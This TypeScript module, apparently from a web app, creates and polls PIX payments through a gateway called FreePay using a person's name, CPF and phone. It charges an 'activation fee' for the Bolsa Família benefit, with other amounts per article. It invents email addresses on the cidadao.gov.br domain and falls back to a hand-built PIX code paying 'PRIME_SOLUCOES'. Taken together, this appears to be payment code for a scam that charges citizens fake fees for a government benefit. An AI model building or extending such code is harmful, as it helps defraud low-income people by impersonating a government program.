import { FREEPAY_CONFIG, getFreePayAuthHeader } from '../config/freepay';

export interface CreatePixParams {
  name: string;
  cpf: string;
  phone: string;
  protocol: string;
  email?: string;
  amount?: number; // Preço/taxa específica deste artigo em reais (ex: 15.00, 19.90, 27.00)
  itemTitle?: string; // Título descritivo do benefício/artigo
}

export interface PixPaymentResult {
  success: boolean;
  transactionId: string;
  qrCode: string;
  qrCodeUrl?: string | null;
  expirationDate?: string;
  status: string;
  amount: number;
  error?: string;
}

export const PAYMENT_AMOUNT = 15.0; // R$ 15,00 padrão
export const PAYMENT_AMOUNT_CENTS = 1500; // 1500 centavos

export async function createPixPayment(params: CreatePixParams): Promise<PixPaymentResult> {
  const cleanCpf = params.cpf.replace(/\D/g, '').padEnd(11, '0').slice(0, 11);
  const cleanPhone = params.phone.replace(/\D/g, '').padEnd(11, '0').slice(0, 11);
  const email =
    params.email && params.email.includes('@')
      ? params.email
      : `cidadao.${cleanCpf.slice(0, 6)}@cidadao.gov.br`;

  // Calcula o valor dinâmico baseado no artigo específico
  const finalAmount = typeof params.amount === 'number' && params.amount > 0 ? params.amount : PAYMENT_AMOUNT;
  const amountCents = Math.round(finalAmount * 100);
  const title = params.itemTitle || 'Taxa de Ativação do Benefício - Bolsa Família';

  const payload = {
    amount: amountCents, // Valor exato em centavos cobrado pelo gateway FreePay
    payment_method: 'pix',
    postback_url: 'https://project-ded1e.web.app/api/webhook',
    customer: {
      name: params.name.trim() || 'Cidadão Beneficiário',
      email: email,
      document: {
        number: cleanCpf,
        type: 'cpf',
      },
      phone: cleanPhone,
    },
    items: [
      {
        title: title.slice(0, 60),
        unit_price: amountCents,
        quantity: 1,
        tangible: false,
      },
    ],
    pix: {
      expires_in_days: 1,
    },
  };

  const authHeader = getFreePayAuthHeader();

  // Try via proxy first (bypasses browser CORS during Vite dev/preview)
  const endpoints = [
    `${FREEPAY_CONFIG.proxyUrl}/v1/payment-transaction/create`,
    `${FREEPAY_CONFIG.directUrl}/v1/payment-transaction/create`,
  ];

  let lastError: Error | null = null;

  for (const endpoint of endpoints) {
    try {
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: {
          Authorization: authHeader,
          'Content-Type': 'application/json',
          Accept: 'application/json',
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.warn(`FreePay endpoint ${endpoint} returned ${response.status}:`, errorText);
        continue;
      }

      const resJson = await response.json();
      const txData = resJson.data;

      if (txData && txData.pix && txData.pix.qr_code) {
        return {
          success: true,
          transactionId: txData.id,
          qrCode: txData.pix.qr_code,
          qrCodeUrl: txData.pix.url || null,
          expirationDate: txData.pix.expiration_date,
          status: txData.status || 'PENDING',
          amount: finalAmount,
        };
      }
    } catch (err: unknown) {
      lastError = err instanceof Error ? err : new Error(String(err));
      console.warn(`FreePay request failed on ${endpoint}:`, err);
    }
  }

  // Fallback em caso de indisponibilidade externa temporária da rede
  console.warn('FreePay API unavailable, generating fallback payload with protocol:', params.protocol);
  const fallbackPix = `00020126870014br.gov.bcb.pix2565qrcode.fyhub.com.br/qr/v3/at/${params.protocol.toLowerCase()}-${amountCents}5204000053039865802BR5925PRIME_SOLUCOES6008BRASILIA62070503***63044749`;

  return {
    success: false,
    transactionId: `FP-${params.protocol}`,
    qrCode: fallbackPix,
    status: 'PENDING',
    amount: finalAmount,
    error: lastError ? lastError.message : 'Falha na comunicação com o gateway',
  };
}

/**
 * Consulta em tempo real o status da transação na FreePay Brasil
 * Endpoint oficial: GET /v1/payment-transaction/info/{id}
 */
export async function checkPixPaymentStatus(transactionId: string): Promise<{ paid: boolean; status: string }> {
  if (!transactionId || transactionId.startsWith('FP-')) {
    return { paid: false, status: 'PENDING' };
  }

  const authHeader = getFreePayAuthHeader();
  const endpoints = [
    `${FREEPAY_CONFIG.proxyUrl}/v1/payment-transaction/info/${transactionId}`,
    `${FREEPAY_CONFIG.directUrl}/v1/payment-transaction/info/${transactionId}`,
  ];

  for (const endpoint of endpoints) {
    try {
      const response = await fetch(endpoint, {
        method: 'GET',
        headers: {
          Authorization: authHeader,
          Accept: 'application/json',
        },
      });

      if (!response.ok) continue;

      const resJson = await response.json();
      const status = (resJson.data?.status || 'PENDING').toUpperCase();

      // Statuses de pagamento confirmado no gateway FreePay
      const isPaid = ['PAID', 'CONFIRMED', 'SETTLED', 'APPROVED', 'PAGO'].includes(status);
      return { paid: isPaid, status };
    } catch (err) {
      console.warn(`Erro ao consultar status em ${endpoint}:`, err);
    }
  }

  return { paid: false, status: 'PENDING' };
}
